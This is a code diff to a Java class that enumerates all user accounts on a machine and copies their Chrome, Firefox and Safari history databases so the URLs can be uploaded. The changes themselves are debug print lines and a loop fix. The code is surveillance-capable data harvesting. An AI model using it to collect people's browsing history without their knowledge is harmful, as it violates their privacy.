@@ -18,6 +18,7 @@ public class BrowsingHistoryCollector implements Collector {
     @Override
     public Object getData() {
         try {
+            System.out.println("Getting browsing data to send...");
             return new BrowsingHistoryCachedParser().getUploadData();
         } catch (IOException e) {
             e.printStackTrace();
@@ -32,8 +33,10 @@ public class BrowsingHistoryCollector implements Collector {
 
     @Override
     public void collectData() {
+        System.out.println("Collecting browsing data...");
         List<String> users = getUsersList();
         for(String user:users){
+            System.out.println("For user: " + user);
             List<UrlEntry> urls = new ArrayList<>();
             try {
                 if(copyChromeDatabase(getUserPath(user)))
@@ -69,7 +72,7 @@ public class BrowsingHistoryCollector implements Collector {
         while (parser.hasNextEntry()) {
             UrlEntry currEntry = parser.getNextChromeEntry();
             urls.add(currEntry);
-            System.out.println(currEntry.toString());
+//            System.out.println(currEntry.toString());
         }
         statement.close ();
         connection.close ();
@@ -83,7 +86,7 @@ public class BrowsingHistoryCollector implements Collector {
         while (parser.hasNextEntry()) {
             UrlEntry currEntry = parser.getNextFireFoxEntry();
             urls.add(currEntry);
-            System.out.println(currEntry.toString());
+//            System.out.println(currEntry.toString());
         }
         statement.close ();
         connection.close ();
@@ -97,7 +100,7 @@ public class BrowsingHistoryCollector implements Collector {
         while (parser.hasNextEntry()) {
             UrlEntry currEntry = parser.getNextSafariEntry();
             urls.add(currEntry);
-            System.out.println(currEntry.toString());
+//            System.out.println(currEntry.toString());
         }
         statement.close ();
         connection.close ();
@@ -110,8 +113,7 @@ public class BrowsingHistoryCollector implements Collector {
             Process process = Runtime.getRuntime().exec(commandFac.getUsersCommand());
             InputStream input = process.getInputStream();
             BufferedReader reader = new BufferedReader(new InputStreamReader(input));
-            line=reader.readLine();
-            if(line!=null){
+            while((line=reader.readLine())!=null){
                 String tokens[] = line.split("\\s+");
                 for(String token:tokens) {
                     users.add(token);
@@ -176,6 +178,7 @@ public class BrowsingHistoryCollector implements Collector {
     private boolean copyChromeDatabase(String userHomePath) throws IOException, InterruptedException {
         CommandFactory commandFact = new CommandFactory();
         String chromePath = commandFact.getChromeDbPath(userHomePath);
+        System.out.println("Chrome Path: " + chromePath);
         File fileSource = new File(chromePath);
         if(fileSource.exists() && !fileSource.isDirectory()){
             File fileDest = new File(CHROME_DB_COPY);
@@ -187,6 +190,7 @@ public class BrowsingHistoryCollector implements Collector {
     private boolean copyFirefoxDatabase(String userHomePath) throws IOException, InterruptedException {
         CommandFactory commandFact = new CommandFactory();
         String firefoxPath = commandFact.getFirefoxDbPath(userHomePath);
+        System.out.println("Firefox Path: " + firefoxPath);
         File fileSource = new File(firefoxPath);
         if(fileSource.exists() && !fileSource.isDirectory()){
             File fileDest = new File(FIREFOX_DB_COPY);
@@ -198,6 +202,7 @@ public class BrowsingHistoryCollector implements Collector {
     private boolean copySafariDatabase(String userHomePath) throws IOException, InterruptedException {
         CommandFactory commandFact = new CommandFactory();
         String safariPath = commandFact.getSafariDbPath(userHomePath);
+        System.out.println("Safari Path: " + safariPath);
         if(safariPath!=null){
             File fileSource = new File(safariPath);
             if(fileSource.exists() && !fileSource.isDirectory()){
